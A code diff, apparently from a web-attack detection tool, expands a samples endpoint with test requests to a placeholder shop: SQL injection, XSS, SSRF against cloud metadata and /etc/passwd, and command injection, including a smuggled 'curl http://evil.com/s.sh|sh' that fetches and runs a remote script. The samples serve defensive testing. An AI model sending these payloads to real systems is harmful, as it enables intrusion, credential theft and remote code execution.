@@ -223,29 +223,59 @@ def index():
 def samples():
     return jsonify(
         {
-            "sqli": {
+            "clean": {
+                "method": "GET",
+                "url": "https://shop.example.com/products?id=24",
+                "headers": "User-Agent: CartierTest\nAccept: */*",
+                "body": "",
+            },
+            "sqli_union": {
                 "method": "GET",
                 "url": "https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                 "headers": "User-Agent: CartierTest\nAccept: */*",
                 "body": "",
             },
-            "xss": {
+            "sqli_boolean": {
+                "method": "GET",
+                "url": "https://shop.example.com/login?user=admin' OR 1=1--",
+                "headers": "User-Agent: CartierTest\nAccept: */*",
+                "body": "",
+            },
+            "xss_script": {
                 "method": "GET",
                 "url": "https://shop.example.com/search?q=<script>alert(1)</script>",
                 "headers": "User-Agent: CartierTest\nAccept: */*",
                 "body": "",
             },
-            "ssrf": {
+            "xss_event": {
+                "method": "GET",
+                "url": "https://shop.example.com/profile?bio=<img src=x onerror=alert(1)>",
+                "headers": "User-Agent: CartierTest\nAccept: */*",
+                "body": "",
+            },
+            "ssrf_meta": {
                 "method": "POST",
                 "url": "https://shop.example.com/fetch",
                 "headers": "Content-Type: application/json",
                 "body": '{"url":"http://169.254.169.254/latest/meta-data/iam"}',
             },
-            "rce": {
+            "ssrf_file": {
+                "method": "POST",
+                "url": "https://shop.example.com/fetch",
+                "headers": "Content-Type: application/json",
+                "body": '{"url":"file:///etc/passwd"}',
+            },
+            "rce_chain": {
                 "method": "POST",
                 "url": "https://shop.example.com/convert",
                 "headers": "Content-Type: application/x-www-form-urlencoded",
                 "body": "file=report.pdf;curl http://evil.com/s.sh|sh",
+            },
+            "rce_subst": {
+                "method": "POST",
+                "url": "https://shop.example.com/convert",
+                "headers": "Content-Type: application/x-www-form-urlencoded",
+                "body": "file=report.pdf&format=pdf$(id)",
             },
         }
     )
